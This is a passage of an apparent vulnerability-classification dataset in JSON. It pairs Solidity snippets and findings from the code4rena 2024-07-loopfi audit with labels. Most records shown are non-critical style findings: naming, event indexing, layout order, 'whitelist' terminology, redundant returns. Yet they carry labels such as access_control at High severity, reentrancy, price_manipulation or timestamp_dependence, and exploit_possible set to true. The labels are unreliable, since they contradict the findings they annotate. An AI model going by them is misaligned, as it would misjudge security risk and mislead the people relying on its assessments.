= totalVesting + earnings[i].amount;\n                 } else {\n                     unlocked = unlocked + earnings[i].amount;\n                 }\n                 unchecked {\n                     i++;\n                 }\n             }\n             return (totalVesting, unlocked, earningsData);\n\n990:     /**\n          * @notice Final balance received and penalty balance paid by user upon calling exit.\n          * @dev This is earnings, not locks.\n          * @param user address.\n          * @return amount total withdrawable amount.\n          * @return penaltyAmount penalty amount.\n          * @return burnAmount amount to burn.\n          */\n         function withdrawableBalance(\n             address user\n         ) public view returns (uint256 amount, uint256 penaltyAmount, uint256 burnAmount) {\n             uint256 earned = _balances[user].earned;\n             if (earned > 0) {\n                 uint256 length = _userEarnings[user].length;\n                 for (uint256 i; i < length; ) {\n                     uint256 earnedAmount = _userEarnings[user][i].amount;\n                     if (earnedAmount == 0) continue;\n                     (, , uint256 newPenaltyAmount, uint256 newBurnAmount) = _penaltyInfo(_userEarnings[user][i]);\n                     penaltyAmount = penaltyAmount + newPenaltyAmount;\n                     burnAmount = burnAmount + newBurnAmount;\n                     unchecked {\n                         i++;\n                     }\n                 }\n             }\n             amount = _balances[user].unlocked + earned - penaltyAmount;\n             return (amount, penaltyAmount, burnAmount);\n\n1044:     /**\n           * @notice Address and claimable amount of all reward tokens for the given account.\n           * @param account for rewards\n           * @return rewardsData array of rewards\n           */\n          function claimableRewards(address account) public view returns (IFeeDistribution.RewardData[] memory rewardsData) {\n              rewardsData = new IFeeDistribution.RewardData[](rewardTokens.length);\n      \n              uint256 length = rewardTokens.length;\n              for (uint256 i; i < length; ) {\n                  rewardsData[i].token = rewardTokens[i];\n                  rewardsData[i].amount =\n                      _earned(\n                          account,\n                          rewardsData[i].token,\n                          _balances[account].lockedWithMultiplier,\n                          rewardPerToken(rewardsData[i].token)\n                      ) /\n                      1e12;\n                  unchecked {\n                      i++;\n                  }\n              }\n              return rewardsData;\n\n1343:     /**\n           * @notice Withdraw all currently locked tokens where the unlock time has passed.\n           * @param address_ of the user.\n           * @param isRelockAction true if withdraw with relock\n           * @param doTransfer true to transfer tokens to user\n           * @param limit limit for looping operation\n           * @return amount for withdraw\n           */\n          function _withdrawExpiredLocksFor(\n              address address_,\n              bool isRelockAction,\n              bool doTransfer,\n              uint256 limit\n          ) internal whenNotPaused returns (uint256 amount) {\n              if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n              _updateReward(address_);\n      \n              uint256 amountWithMultiplier;\n              Balances storage bal = _balances[address_];\n              (amount, amountWithMultiplier) = _cleanWithdrawableLocks(address_, limit);\n              bal.locked = bal.locked - amount;\n              bal.lockedWithMultiplier = bal.lockedWithMultiplier - amountWithMultiplier;\n              bal.total = bal.total - amount;\n              lockedSupply = lockedSupply - amount;\n              lockedSupplyWithMultiplier = lockedSupplyWithMultiplier - amountWithMultiplier;\n      \n              if (isRelockAction || (address_ != msg.sender && !autoRelockDisabled[address_])) {\n                  _stake(amount, address_, defaultLockIndex[address_], true);\n              } else {\n                  if (doTransfer) {\n                      IERC20(stakingToken).safeTransfer(address_, amount);\n                      incentivesController.afterLockUpdate(address_);\n                      emit Withdrawn(address_, amount, _balances[address_].locked, 0, 0, stakingToken != address(rdntToken));\n                  } else {\n                      revert InvalidAction();\n                  }\n              }\n              return amount;\n\n1385:     /**\n           * @notice Returns withdrawable balance at exact unlock time\n           * @param user address for withdraw\n           * @param unlockTime exact unlock time\n           * @return amount total withdrawable amount\n           * @return penaltyAmount penalty amount\n           * @return burnAmount amount to burn\n           * @return index of earning\n           */\n          function _ieeWithdrawableBalance(\n              address user,\n              uint256 unlockTime\n          ) internal view returns (uint256 amount, uint256 penaltyAmount, uint256 burnAmount, uint256 index) {\n              uint256 length = _userEarnings[user].length;\n              for (index; index < length; ) {\n                  if (_userEarnings[user][index].unlockTime == unlockTime) {\n                      (amount, , penaltyAmount, burnAmount) = _penaltyInfo(_userEarnings[user][index]);\n                      return (amount, penaltyAmount, burnAmount, index);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"NC-33\"></a>[NC-33] Adding a `return` statement when the function defines a named return variable, is redundant",
    "description": "*Instances (28)*: File: src/CDPVault.sol 462:     function _calcQuotaRevenueChange(int256 deltaDebt) internal view returns (int256 quotaRevenueChange) { uint16 rate = IPoolQuotaKeeperV3(poolQuotaKeeper()).getQuotaRate(address(token)); return QuotasLogic.calcQuotaRevenueChange(rate, deltaDebt);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 218,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n232:         if (rdntToken_ == address(0)) revert AddressZero();\n\n233:         if (lockZap_ == address(0)) revert AddressZero();\n\n234:         if (dao_ == address(0)) revert AddressZero();\n\n235:         if (priceProvider_ == address(0)) revert AddressZero();\n\n236:         if (rewardsDuration_ == uint256(0)) revert AmountZero();\n\n237:         if (rewardsLookback_ == uint256(0)) revert AmountZero();\n\n238:         if (lockDuration_ == uint256(0)) revert AmountZero();\n\n239:         if (vestDuration_ == uint256(0)) revert AmountZero();\n\n240:         if (burnRatio_ > WHOLE) revert InvalidBurn();\n\n241:         if (rewardsLookback_ > rewardsDuration_) revert InvalidLookback();\n\n269:             if (minters_[i] == address(0)) revert AddressZero();\n\n283:         if (bounty == address(0)) revert AddressZero();\n\n294:         if (rewardConverter_ == address(0)) revert AddressZero();\n\n305:         if (lockPeriod_.length != rewardMultipliers_.length) revert InvalidLockPeriod();\n\n325:         if (address(controller_) == address(0)) revert AddressZero();\n\n326:         if (address(treasury_) == address(0)) revert AddressZero();\n\n337:         if (stakingToken_ == address(0)) revert AddressZero();\n\n338:         if (stakingToken != address(0)) revert AlreadySet();\n\n348:         if (_rewardToken == address(0)) revert AddressZero();\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n350:         if (rewardData[_rewardToken].lastUpdateTime != 0) revert AlreadyAdded();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n380:         if (!isTokenFound) revert InvalidAddress();\n\n405:         if (index >= _lockPeriod.length) revert InvalidType();\n\n417:             revert InvalidAmount();\n\n428:             revert InvalidAmount();\n\n453:         if (lookback == uint256(0)) revert AmountZero();\n\n454:         if (lookback > rewardsDuration) revert InvalidLookback();\n\n468:         if (_operationExpenseRatio > RATIO_DIVISOR) revert InvalidRatio();\n\n469:         if (_operationExpenseReceiver == address(0)) revert AddressZero();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n539:         if (amount == 0) revert AmountZero();\n\n549:             if (bal.earned < remaining) revert InvalidEarned();\n\n583:                     if (sumEarned == 0) revert InvalidEarned();\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1083:             if (amount < IBountyManager(bountyManager).minDLPBalance()) revert InvalidAmount();\n\n1085:         if (typeIndex >= _lockPeriod.length) revert InvalidType();\n\n1224:         if (token == address(0)) revert AddressZero();\n\n1230:         if (periodFinish == 0) revert InvalidPeriod();\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n1377:                 revert InvalidAction();\n\n1408:         revert UnlockTimeNotFound();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-34\"></a>[NC-34] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (190)*: File: src/CDPVault.sol 200:         else revert CDPVault__setParameter_unrecognizedParameter(); 210:         else revert CDPVault__setParameter_unrecognizedParameter();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n39:     uint256 public constant WHOLE = 100000; // 100%\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-36\"></a>[NC-36] Use scientific notation for readability reasons for large multiples of ten",
    "description": "The more a number has zeros, the harder it becomes to see with the eyes if it's the intended value. To ease auditing and bug bounty hunting, consider using the scientific notation *Instances (1)*: File: src/reward/MultiFeeDistribution.sol 39:     uint256 public constant WHOLE = 100000; // 100% [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/MultiFeeDistribution.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.109,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n112:     error NotWhitelisted();\n\n209:     mapping(address => bool) public whitelist;\n\n211:     bool public whitelistActive;\n\n216:     modifier isWhitelisted() {\n\n217:         if (whitelistActive) {\n\n218:             if (!whitelist[msg.sender] && msg.sender != address(this)) revert NotWhitelisted();\n\n813:     function manualStopEmissionsFor(address _user, address[] memory _tokens) public isWhitelisted {\n\n844:     function manualStopAllEmissionsFor(address _user) external isWhitelisted {\n\n1006:         whitelist[user] = status;\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n1013:         whitelistActive = !whitelistActive;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-37\"></a>[NC-37] Avoid the use of sensitive terms",
    "description": "Use [alternative variants](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/), e.g. allowlist/denylist instead of whitelist/blacklist *Instances (11)*: File: src/reward/ChefIncentivesController.sol 112:     error NotWhitelisted(); 209:     mapping(address => bool) public whitelist;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.7,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n1: \n   Current order:\n   UsingForDirective.IERC20\n   UsingForDirective.IMintableToken\n   VariableDeclaration._priceProvider\n   VariableDeclaration.QUART\n   VariableDeclaration.HALF\n   VariableDeclaration.WHOLE\n   VariableDeclaration.MAX_SLIPPAGE\n   VariableDeclaration.PERCENT_DIVISOR\n   VariableDeclaration.AGGREGATION_EPOCH\n   VariableDeclaration.RATIO_DIVISOR\n   VariableDeclaration.burn\n   VariableDeclaration.rewardsDuration\n   VariableDeclaration.rewardsLookback\n   VariableDeclaration.DEFAULT_LOCK_INDEX\n   VariableDeclaration.defaultLockDuration\n   VariableDeclaration.vestDuration\n   VariableDeclaration.rewardConverter\n   VariableDeclaration.incentivesController\n   VariableDeclaration.rdntToken\n   VariableDeclaration.stakingToken\n   VariableDeclaration._lockZap\n   VariableDeclaration._balances\n   VariableDeclaration._userLocks\n   VariableDeclaration._userEarnings\n   VariableDeclaration.autocompoundEnabled\n   VariableDeclaration.lastAutocompound\n   VariableDeclaration.lockedSupply\n   VariableDeclaration.lockedSupplyWithMultiplier\n   VariableDeclaration._lockPeriod\n   VariableDeclaration._rewardMultipliers\n   VariableDeclaration.rewardTokens\n   VariableDeclaration.rewardData\n   VariableDeclaration.userRewardPerTokenPaid\n   VariableDeclaration.rewards\n   VariableDeclaration.daoTreasury\n   VariableDeclaration.starfleetTreasury\n   VariableDeclaration.minters\n   VariableDeclaration.autoRelockDisabled\n   VariableDeclaration.defaultLockIndex\n   VariableDeclaration.mintersAreSet\n   VariableDeclaration.lastClaimTime\n   VariableDeclaration.bountyManager\n   VariableDeclaration.userSlippage\n   VariableDeclaration.operationExpenseRatio\n   VariableDeclaration.operationExpenseReceiver\n   VariableDeclaration.isRewardToken\n   EventDefinition.Locked\n   EventDefinition.Withdrawn\n   EventDefinition.RewardPaid\n   EventDefinition.Relocked\n   EventDefinition.BountyManagerUpdated\n   EventDefinition.RewardConverterUpdated\n   EventDefinition.LockTypeInfoUpdated\n   EventDefinition.AddressesUpdated\n   EventDefinition.LPTokenUpdated\n   EventDefinition.RewardAdded\n   EventDefinition.LockerAdded\n   EventDefinition.LockerRemoved\n   EventDefinition.RevenueEarned\n   EventDefinition.OperationExpensesUpdated\n   EventDefinition.NewTransferAdded\n   ErrorDefinition.AddressZero\n   ErrorDefinition.AmountZero\n   ErrorDefinition.InvalidBurn\n   ErrorDefinition.InvalidRatio\n   ErrorDefinition.InvalidLookback\n   ErrorDefinition.MintersSet\n   ErrorDefinition.InvalidLockPeriod\n   ErrorDefinition.InsufficientPermission\n   ErrorDefinition.AlreadyAdded\n   ErrorDefinition.AlreadySet\n   ErrorDefinition.InvalidType\n   ErrorDefinition.ActiveReward\n   ErrorDefinition.InvalidAmount\n   ErrorDefinition.InvalidEarned\n   ErrorDefinition.InvalidTime\n   ErrorDefinition.InvalidPeriod\n   ErrorDefinition.UnlockTimeNotFound\n   ErrorDefinition.InvalidAddress\n   ErrorDefinition.InvalidAction\n   FunctionDefinition.constructor\n   FunctionDefinition.initialize\n   FunctionDefinition.setMinters\n   FunctionDefinition.setBountyManager\n   FunctionDefinition.addRewardConverter\n   FunctionDefinition.setLockTypeInfo\n   FunctionDefinition.setAddresses\n   FunctionDefinition.setLPToken\n   FunctionDefinition.addReward\n   FunctionDefinition.removeReward\n   FunctionDefinition.setDefaultRelockTypeIndex\n   FunctionDefinition.setAutocompound\n   FunctionDefinition.setUserSlippage\n   FunctionDefinition.toggleAutocompound\n   FunctionDefinition.setRelock\n   FunctionDefinition.setLookback\n   FunctionDefinition.setOperationExpenses\n   FunctionDefinition.stake\n   FunctionDefinition.vestTokens\n   FunctionDefinition.withdraw\n   FunctionDefinition.individualEarlyExit\n   FunctionDefinition.exit\n   FunctionDefinition.getAllRewards\n   FunctionDefinition.withdrawExpiredLocksForWithOptions\n   FunctionDefinition.zapVestingToLp\n   FunctionDefinition.claimFromConverter\n   FunctionDefinition.relock\n   FunctionDefinition.requalify\n   FunctionDefinition.recoverERC20\n   FunctionDefinition.getLockDurations\n   FunctionDefinition.getLockMultipliers\n   FunctionDefinition.lockInfo\n   FunctionDefinition.totalBalance\n   FunctionDefinition.getPriceProvider\n   FunctionDefinition.getRewardForDuration\n   FunctionDefinition.getBalances\n   FunctionDefinition.claimBounty\n   FunctionDefinition.getReward\n   FunctionDefinition.pause\n   FunctionDefinition.unpause\n   FunctionDefinition.requalifyFor\n   FunctionDefinition.lockedBalances\n   FunctionDefinition.lockedBalance\n   FunctionDefinition.earnedBalances\n   FunctionDefinition.withdrawableBalance\n   FunctionDefinition.lastTimeRewardApplicable\n   FunctionDefinition.rewardPerToken\n   FunctionDefinition.claimableRewards\n   FunctionDefinition._stake\n   FunctionDefinition._updateReward\n   FunctionDefinition._notifyReward\n   FunctionDefinition._notifyUnseenReward\n   FunctionDefinition._getReward\n   FunctionDefinition._withdrawTokens\n   FunctionDefinition._cleanWithdrawableLocks\n   FunctionDefinition._withdrawExpiredLocksFor\n   FunctionDefinition._ieeWithdrawableBalance\n   FunctionDefinition._insertLock\n   FunctionDefinition._earned\n   FunctionDefinition._penaltyInfo\n   FunctionDefinition._binarySearch\n   \n   Suggested order:\n   UsingForDirective.IERC20\n   UsingForDirective.IMintableToken\n   VariableDeclaration._priceProvider\n   VariableDeclaration.QUART\n   VariableDeclaration.HALF\n   VariableDeclaration.WHOLE\n   VariableDeclaration.MAX_SLIPPAGE\n   VariableDeclaration.PERCENT_DIVISOR\n   VariableDeclaration.AGGREGATION_EPOCH\n   VariableDeclaration.RATIO_DIVISOR\n   VariableDeclaration.burn\n   VariableDeclaration.rewardsDuration\n   VariableDeclaration.rewardsLookback\n   VariableDeclaration.DEFAULT_LOCK_INDEX\n   VariableDeclaration.defaultLockDuration\n   VariableDeclaration.vestDuration\n   VariableDeclaration.rewardConverter\n   VariableDeclaration.incentivesController\n   VariableDeclaration.rdntToken\n   VariableDeclaration.stakingToken\n   VariableDeclaration._lockZap\n   VariableDeclaration._balances\n   VariableDeclaration._userLocks\n   VariableDeclaration._userEarnings\n   VariableDeclaration.autocompoundEnabled\n   VariableDeclaration.lastAutocompound\n   VariableDeclaration.lockedSupply\n   VariableDeclaration.lockedSupplyWithMultiplier\n   VariableDeclaration._lockPeriod\n   VariableDeclaration._rewardMultipliers\n   VariableDeclaration.rewardTokens\n   VariableDeclaration.rewardData\n   VariableDeclaration.userRewardPerTokenPaid\n   VariableDeclaration.rewards\n   VariableDeclaration.daoTreasury\n   VariableDeclaration.starfleetTreasury\n   VariableDeclaration.minters\n   VariableDeclaration.autoRelockDisabled\n   VariableDeclaration.defaultLockIndex\n   VariableDeclaration.mintersAreSet\n   VariableDeclaration.lastClaimTime\n   VariableDeclaration.bountyManager\n   VariableDeclaration.userSlippage\n   VariableDeclaration.operationExpenseRatio\n   VariableDeclaration.operationExpenseReceiver\n   VariableDeclaration.isRewardToken\n   ErrorDefinition.AddressZero\n   ErrorDefinition.AmountZero\n   ErrorDefinition.InvalidBurn\n   ErrorDefinition.InvalidRatio\n   ErrorDefinition.InvalidLookback\n   ErrorDefinition.MintersSet\n   ErrorDefinition.InvalidLockPeriod\n   ErrorDefinition.InsufficientPermission\n   ErrorDefinition.AlreadyAdded\n   ErrorDefinition.AlreadySet\n   ErrorDefinition.InvalidType\n   ErrorDefinition.ActiveReward\n   ErrorDefinition.InvalidAmount\n   ErrorDefinition.InvalidEarned\n   ErrorDefinition.InvalidTime\n   ErrorDefinition.InvalidPeriod\n   ErrorDefinition.UnlockTimeNotFound\n   ErrorDefinition.InvalidAddress\n   ErrorDefinition.InvalidAction\n   EventDefinition.Locked\n   EventDefinition.Withdrawn\n   EventDefinition.RewardPaid\n   EventDefinition.Relocked\n   EventDefinition.BountyManagerUpdated\n   EventDefinition.RewardConverterUpdated\n   EventDefinition.LockTypeInfoUpdated\n   EventDefinition.AddressesUpdated\n   EventDefinition.LPTokenUpdated\n   EventDefinition.RewardAdded\n   EventDefinition.LockerAdded\n   EventDefinition.LockerRemoved\n   EventDefinition.RevenueEarned\n   EventDefinition.OperationExpensesUpdated\n   EventDefinition.NewTransferAdded\n   FunctionDefinition.constructor\n   FunctionDefinition.initialize\n   FunctionDefinition.setMinters\n   FunctionDefinition.setBountyManager\n   FunctionDefinition.addRewardConverter\n   FunctionDefinition.setLockTypeInfo\n   FunctionDefinition.setAddresses\n   FunctionDefinition.setLPToken\n   FunctionDefinition.addReward\n   FunctionDefinition.removeReward\n   FunctionDefinition.setDefaultRelockTypeIndex\n   FunctionDefinition.setAutocompound\n   FunctionDefinition.setUserSlippage\n   FunctionDefinition.toggleAutocompound\n   FunctionDefinition.setRelock\n   FunctionDefinition.setLookback\n   FunctionDefinition.setOperationExpenses\n   FunctionDefinition.stake\n   FunctionDefinition.vestTokens\n   FunctionDefinition.withdraw\n   FunctionDefinition.individualEarlyExit\n   FunctionDefinition.exit\n   FunctionDefinition.getAllRewards\n   FunctionDefinition.withdrawExpiredLocksForWithOptions\n   FunctionDefinition.zapVestingToLp\n   FunctionDefinition.claimFromConverter\n   FunctionDefinition.relock\n   FunctionDefinition.requalify\n   FunctionDefinition.recoverERC20\n   FunctionDefinition.getLockDurations\n   FunctionDefinition.getLockMultipliers\n   FunctionDefinition.lockInfo\n   FunctionDefinition.totalBalance\n   FunctionDefinition.getPriceProvider\n   FunctionDefinition.getRewardForDuration\n   FunctionDefinition.getBalances\n   FunctionDefinition.claimBounty\n   FunctionDefinition.getReward\n   FunctionDefinition.pause\n   FunctionDefinition.unpause\n   FunctionDefinition.requalifyFor\n   FunctionDefinition.lockedBalances\n   FunctionDefinition.lockedBalance\n   FunctionDefinition.earnedBalances\n   FunctionDefinition.withdrawableBalance\n   FunctionDefinition.lastTimeRewardApplicable\n   FunctionDefinition.rewardPerToken\n   FunctionDefinition.claimableRewards\n   FunctionDefinition._stake\n   FunctionDefinition._updateReward\n   FunctionDefinition._notifyReward\n   FunctionDefinition._notifyUnseenReward\n   FunctionDefinition._getReward\n   FunctionDefinition._withdrawTokens\n   FunctionDefinition._cleanWithdrawableLocks\n   FunctionDefinition._withdrawExpiredLocksFor\n   FunctionDefinition._ieeWithdrawableBalance\n   FunctionDefinition._insertLock\n   FunctionDefinition._earned\n   FunctionDefinition._penaltyInfo\n   FunctionDefinition._binarySearch\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-38\"></a>[NC-38] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 291,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/utils/Math.sol\n\n17: function toInt256(uint256 x) pure returns (int256) {\n\n23: function toUint64(uint256 x) pure returns (uint64) {\n\n29: function abs(int256 x) pure returns (uint256 z) {\n\n37: function min(uint256 x, uint256 y) pure returns (uint256 z) {\n\n44: function min(int256 x, int256 y) pure returns (int256 z) {\n\n51: function max(uint256 x, uint256 y) pure returns (uint256 z) {\n\n58: function add(uint256 x, int256 y) pure returns (uint256 z) {\n\n66: function sub(uint256 x, int256 y) pure returns (uint256 z) {\n\n74: function mul(uint256 x, int256 y) pure returns (int256 z) {\n\n83: function wmul(uint256 x, uint256 y) pure returns (uint256 z) {\n\n97: function wmul(uint256 x, int256 y) pure returns (int256 z) {\n\n105: function wmulUp(uint256 x, uint256 y) pure returns (uint256 z) {\n\n121: function wdiv(uint256 x, uint256 y) pure returns (uint256 z) {\n\n137: function wdivUp(uint256 x, uint256 y) pure returns (uint256 z) {\n\n152: function wpow(uint256 x, uint256 n, uint256 b) pure returns (uint256 z) {\n\n208: function wpow(int256 x, int256 y) pure returns (int256) {\n\n215: function wexp(int256 x) pure returns (int256 r) {\n\n282: function wln(int256 x) pure returns (int256 r) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-40\"></a>[NC-40] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (39)*: File: src/CDPVault.sol 652:     function calcDecrease( 717:     function calcAccruedInterest(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n159:     event Locked(address indexed user, uint256 amount, uint256 lockedBalance, uint256 indexed lockLength, bool isLP);\n\n160:     event Withdrawn(\n\n168:     event RewardPaid(address indexed user, address indexed rewardToken, uint256 reward);\n\n169:     event Relocked(address indexed user, uint256 amount, uint256 lockIndex);\n\n172:     event LockTypeInfoUpdated(uint256[] lockPeriod, uint256[] rewardMultipliers);\n\n173:     event AddressesUpdated(IChefIncentivesController _controller, address indexed _treasury);\n\n178:     event RevenueEarned(address indexed asset, uint256 assetAmount);\n\n179:     event OperationExpensesUpdated(address indexed _operationExpenses, uint256 _operationExpenseRatio);\n\n180:     event NewTransferAdded(address indexed asset, uint256 lpUsdValue);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-41\"></a>[NC-41] Event is missing `indexed` fields",
    "description": "Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed. *Instances (27)*: File: src/CDPVault.sol 125:     event ModifyPosition(address indexed position, uint256 debt, uint256 collateral, uint256 totalDebt); 133:     event SetParameter(bytes32 indexed parameter, uint256 data);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.831,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n221:     function initialize(\n\n843:     function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n\n873:     function pause() public onlyOwner {\n\n880:     function unpause() public onlyOwner {\n\n940:     function lockedBalance(address user) public view returns (uint256 locked) {\n\n961:     function earnedBalances(\n\n1049:     function claimableRewards(address account) public view returns (IFeeDistribution.RewardData[] memory rewardsData) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "<a name=\"NC-43\"></a>[NC-43] `public` functions not called by the contract should be declared `external` instead",
    "description": "*Instances (20)*: File: src/proxy/PoolAction.sol 195:     function exit(PoolActionParams memory poolActionParams) public returns (uint256 retAmount) { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PoolAction.sol) File: src/proxy/SwapAction.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.538,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PoolAction.sol\n\n81:                 for (uint256 i = 0; i < assets.length; ) {\n\n116:         for (uint256 i = 0; i < assets.length; ) {\n\n168:             for (uint256 i = 0; i < len; ) {\n\n227:         for (uint256 i = 0; i <= outIndex; ) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"NC-44\"></a>[NC-44] Variables need not be initialized to zero",
    "description": "The default value for variables is zero, so initializing them to zero is superfluous. *Instances (16)*: File: src/VaultRegistry.sol 67:         for (uint256 i = 0; i < vaultLen; ) { 82:         for (uint256 i = 0; i < vaultLen; ) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.266,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Ownable2Step.transferOwnership",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Low Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [L-1](#L-1) | `approve()`/`safeApprove()` may revert if the current approval is not zero | 3 | | [L-2](#L-2) | Use a 2-step ownership transfer pattern | 3 | | [L-3](#L-3) | Some tokens may revert when zero value transfers are made | 36 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] `approve()`/`safeApprove()` may revert if the current approval is not zero",
